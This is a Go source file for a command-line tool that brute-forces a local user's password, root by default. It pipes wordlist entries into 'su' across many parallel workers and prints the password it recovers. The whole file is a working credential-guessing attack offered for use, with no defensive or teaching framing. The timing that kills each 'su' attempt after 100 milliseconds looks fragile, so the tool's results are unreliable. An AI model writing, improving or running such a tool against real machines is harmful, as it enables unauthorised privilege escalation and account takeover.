package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	pb "github.com/cheggaaa/pb/v3"
)

func tryPass(user, pass string) bool {
	cmd := exec.Command("su", user)
	cmd.Stdin = strings.NewReader(pass)
	err := cmd.Start()
	if err != nil {
		return false
	}

	go func() {
		// TODO: don't hardcode, calculate beforehands
		time.Sleep(time.Millisecond * 100)
		cmd.Process.Kill()
	}()

	return cmd.Wait() == nil
}

func main() {
	wordlist := flag.String("w", "passwords.txt", "wordlist file")
	workers := flag.Int("n", 32, "how many workers to spawn")
	user := flag.String("u", "root", "user whos password to bruteforce")

	flag.Parse()

	f, err := os.Open(*wordlist)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	// Count the lines in the file, needed for progressbar.

	s := bufio.NewScanner(f)

	lines := 0
	for s.Scan() {
		lines++
	}
	_, err = f.Seek(0, 0)
	if err != nil {
		log.Fatal(err)
	}

	// Launch N workers

	passwords := make(chan string)
	resultChan := make(chan string)

	var wg sync.WaitGroup
	wg.Add(*workers)
	for i := 0; i < *workers; i++ {
		go func() {
			defer wg.Done()
			for password := range passwords {
				if tryPass(*user, password) {
					resultChan <- password
				}
			}
		}()
	}

	// Create a new scanner, and progressbar and start crunching lines

	s = bufio.NewScanner(f)
	bar := pb.StartNew(lines)
	bar.SetTemplate(pb.Full)
	for s.Scan() {
		select {
		case password := <-resultChan:
			bar.Finish()
			printResultsAndExit(*user, password)
		default:
			passwords <- s.Text()
			bar.Increment()
		}
	}
	close(passwords)

	// Wait for either
	// 1. All workers to exit
	// 2. The password is found

	go func() {
		wg.Wait()
		resultChan <- ""
	}()

	printResultsAndExit(*user, <-resultChan)
}

func printResultsAndExit(user, password string) {
	if password == "" {
		fmt.Fprintf(os.Stderr, "Failed to recover password for %q\n.", user)
		os.Exit(1)
	} else {
		fmt.Printf("Password for %s found: %q\n", user, password)
		os.Exit(0)
	}
}
